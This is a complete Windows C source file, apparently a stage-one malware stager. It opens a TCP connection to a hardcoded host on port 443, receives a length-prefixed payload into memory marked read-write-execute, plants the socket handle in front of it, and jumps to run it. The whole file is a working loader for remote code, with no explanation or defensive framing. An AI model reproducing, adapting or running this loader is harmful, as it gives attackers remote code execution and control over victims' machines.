#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
void winsock_init() {
	WSADATA	wsaData;
	WORD 		wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		printf("ws2_32.dll is out of date.\n");
		WSACleanup();
		exit(1);
	}
}
void Kick(SOCKET my_socket, char * error) {
	printf("error: %s\n", error);
	closesocket(my_socket);
	WSACleanup();
	exit(1);
}
int recv_all(SOCKET my_socket, void * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	void * startb = buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;
		if (nret == SOCKET_ERROR)
			Kick(my_socket, "Could not receive data");
	}
	return tret;
}
SOCKET wsconnect(char * targetip, int port) {
	struct hostent *		target;
	struct sockaddr_in 	sock;
	SOCKET 			my_socket;
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == INVALID_SOCKET)
		Kick(my_socket, "Can't initialize socket");
	target = gethostbyname(targetip);
	if (target == NULL)
		Kick(my_socket, "can't resolve target");
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
		Kick(my_socket, "Could not connect");
	return my_socket;
}
int main(int argc) {
	ULONG32 size;
	char * buffer;
	void (*function)();
	winsock_init();
	char argv[3][25];

	strcpy(argv[1],"192.168.1.116");
	strcpy(argv[2],"443");

	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
	int count = recv(my_socket, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		Kick(my_socket, "bad length value\n");
	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL)
		Kick(my_socket, "bad buffer\n");
	buffer[0] = 0xBF;
	memcpy(buffer + 1, &my_socket, 4);
	count = recv_all(my_socket, buffer + 5, size);
	function = (void (*)())buffer;
	function();
	return 0;
}